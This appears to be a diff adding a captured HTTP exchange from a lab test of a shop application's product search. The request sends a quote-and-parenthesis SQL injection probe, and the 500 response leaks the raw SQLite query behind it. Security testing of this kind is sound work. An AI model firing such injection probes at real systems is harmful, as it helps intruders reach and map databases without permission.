@@ -1,0 +1,30 @@
+GET http://192.168.8.101:3000/rest/products/search?q=%27%28 HTTP/1.1
+host: 192.168.8.101:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Referer: http://192.168.8.101:3000/
+Connection: keep-alive
+
+HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: application/json; charset=utf-8
+Vary: Accept-Encoding
+Date: Thu, 09 Oct 2025 16:20:21 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+content-length: 309
+
+{
+  "error": {
+    "message": "SQLITE_ERROR: near \"(\": syntax error",
+    "stack": "Error: SQLITE_ERROR: near \"(\": syntax error",
+    "errno": 1,
+    "code": "SQLITE_ERROR",
+    "sql": "SELECT * FROM Products WHERE ((name LIKE '%'(%' OR description LIKE '%'(%') AND deletedAt IS NULL) ORDER BY name"
+  }
+}
